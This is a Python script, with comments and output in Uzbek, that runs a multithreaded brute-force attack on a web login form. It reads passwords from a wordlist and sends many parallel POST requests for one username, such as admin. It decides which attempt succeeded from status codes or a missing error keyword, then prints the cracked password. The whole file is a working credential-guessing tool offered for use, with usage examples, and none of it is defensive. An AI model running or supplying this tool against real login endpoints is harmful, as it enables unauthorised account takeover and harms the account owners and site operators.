import requests
import argparse
import threading
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed


# Parol topilganini barcha threadlarga signal berish uchun
topildi_event = threading.Event()
natija_lock = threading.Lock()
hisoblagich = {"yuborildi": 0}


def bitta_sorov(url, username, parol, xato_soz, tartib, jami):
    """Bitta parol bilan POST so'rov yuboradi"""

    # Agar boshqa thread parolni topgan bo'lsa — to'xtatish
    if topildi_event.is_set():
        return None

    data = {
        "username": username,
        "password": parol
    }

    try:
        javob = requests.post(url, json=data, timeout=10, allow_redirects=False)

        status = javob.status_code
        javob_matni = javob.text
        uzunlik = len(javob_matni)

        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]

        # ===== PAROL TO'G'RI YOKI YO'QLIGINI TEKSHIRISH =====
        togri = False

        if status >= 400:
            togri = False
        elif xato_soz:
            if xato_soz.lower() not in javob_matni.lower():
                togri = True
        else:
            if status in (200, 301, 302, 303):
                togri = True

        if togri:
            topildi_event.set()  # Boshqa threadlarga TO'XTA signal
            print(f"\n  {'*'*55}")
            print(f"  *  PAROL TOPILDI!")
            print(f"  *")
            print(f"  *  Username : {username}")
            print(f"  *  Password : {parol}")
            print(f"  *  Status   : {status}")
            print(f"  *  Urinish  : {joriy}/{jami}")
            print(f"  {'*'*55}\n")
            return parol

        # Noto'g'ri parol
        print(f"  [-] {joriy:>4}/{jami} | {parol:<30} | Status: {status} | Hajm: {uzunlik}")

    except requests.exceptions.Timeout:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [T] {joriy:>4}/{jami} | {parol:<30} | TIMEOUT")
    except requests.exceptions.ConnectionError:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [X] {joriy:>4}/{jami} | {parol:<30} | ULANIB BO'LMADI")
    except Exception as e:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [?] {joriy:>4}/{jami} | {parol:<30} | Xato: {e}")

    return None


def post_yuborish(url, username, parol_fayl, xato_soz=None, threadlar=10):
    """
    Berilgan URL'ga parallel ravishda POST so'rovlar yuboradi.
    To'g'ri parol topilsa barcha threadlar to'xtaydi.
    """

    # Parollarni fayldan o'qish
    try:
        with open(parol_fayl, 'r', encoding='utf-8') as f:
            parollar = [qator.strip() for qator in f if qator.strip()]
    except FileNotFoundError:
        print(f"[XATO] Fayl topilmadi: {parol_fayl}")
        return None
    except Exception as e:
        print(f"[XATO] Faylni o'qishda muammo: {e}")
        return None

    print(f"\n{'='*55}")
    print(f"  POST SO'ROV YUBORUVCHI (PARALLEL)")
    print(f"{'='*55}")
    print(f"  URL      : {url}")
    print(f"  Username : {username}")
    print(f"  Fayl     : {parol_fayl}")
    print(f"  Parollar : {len(parollar)} ta")
    print(f"  Threadlar: {threadlar} ta")
    print(f"  Xato so'z: {xato_soz or '(belgilanmagan)'}")
    print(f"{'='*55}\n")

    topilgan_parol = None

    with ThreadPoolExecutor(max_workers=threadlar) as executor:
        # Barcha parollarni threadlarga taqsimlash
        futures = {
            executor.submit(bitta_sorov, url, username, parol, xato_soz, i, len(parollar)): parol
            for i, parol in enumerate(parollar, 1)
        }

        for future in as_completed(futures):
            natija = future.result()
            if natija:
                topilgan_parol = natija
                # Qolgan kutilayotgan ishlarni bekor qilish
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not topilgan_parol:
        print(f"\n  Parol topilmadi. {hisoblagich['yuborildi']} ta parol sinab ko'rildi.\n")

    return topilgan_parol


def main():
    parser = argparse.ArgumentParser(
        description='URL\'ga parallel POST so\'rov yuboruvchi',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python post_yuborish.py -u https://sayt.com/login -n admin -p parollar.txt -x "Invalid"
  python post_yuborish.py -u https://sayt.com/login -n admin -p parollar.txt -x "error" -t 20
        """
    )

    parser.add_argument(
        '-u', '--url',
        required=True,
        help='POST so\'rov yuboriladigan URL manzil'
    )

    parser.add_argument(
        '-n', '--username',
        required=True,
        help='Foydalanuvchi nomi (username)'
    )

    parser.add_argument(
        '-p', '--parollar',
        required=True,
        help='Parollar joylashgan .txt fayl yo\'li'
    )

    parser.add_argument(
        '-x', '--xato_soz',
        type=str,
        default=None,
        help='Noto\'g\'ri parolda javobda chiqadigan so\'z (masalan: "Invalid", "error")'
    )

    parser.add_argument(
        '-t', '--threadlar',
        type=int,
        default=10,
        help='Parallel threadlar soni (standart: 10)'
    )

    args = parser.parse_args()

    post_yuborish(args.url, args.username, args.parollar, args.xato_soz, args.threadlar)


if __name__ == '__main__':
    main()
